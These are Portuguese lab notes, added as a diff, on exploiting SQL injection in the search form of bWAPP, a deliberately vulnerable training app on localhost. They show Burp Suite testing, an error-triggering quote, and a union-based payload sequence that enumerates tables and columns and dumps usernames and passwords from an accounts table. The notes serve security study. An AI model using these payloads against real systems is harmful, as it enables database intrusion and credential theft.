@@ -1,0 +1,20 @@
+SQL Injection (POST/Search)
+
+http://127.0.0.1/bwapp/sqli_6.php
+
+Vamos testar a existência da vulnerabilidade pelo comparer do burpsuite
+
+Vamos enviar a requisição para o repeater fazemos um send e enviamos a resposta para o comparer
+Vamos repetir a requisição mas vamos passar uma aspas simples ---> '
+    |-> title=test123'&action=search
+
+Podemos adicionar uma aspas simples no campo de pesquisa da aplicação.
+    |-> Retorna: Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
+
+
+VAMOS EXPLORAR A FALHA NA ÁREA DE BUSCA:
+    ' order by 7#
+    ' union select 1,database(),3,4,5,6,7#
+    ' union select 1,table_name,table_schema,4,5,6,7 from information_schema.tables#
+    ' union select 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema="mutillidae" AND table_name="accounts"#
+    ' union select 1,username,password,4,5,6,7 from mutillidae.accounts#
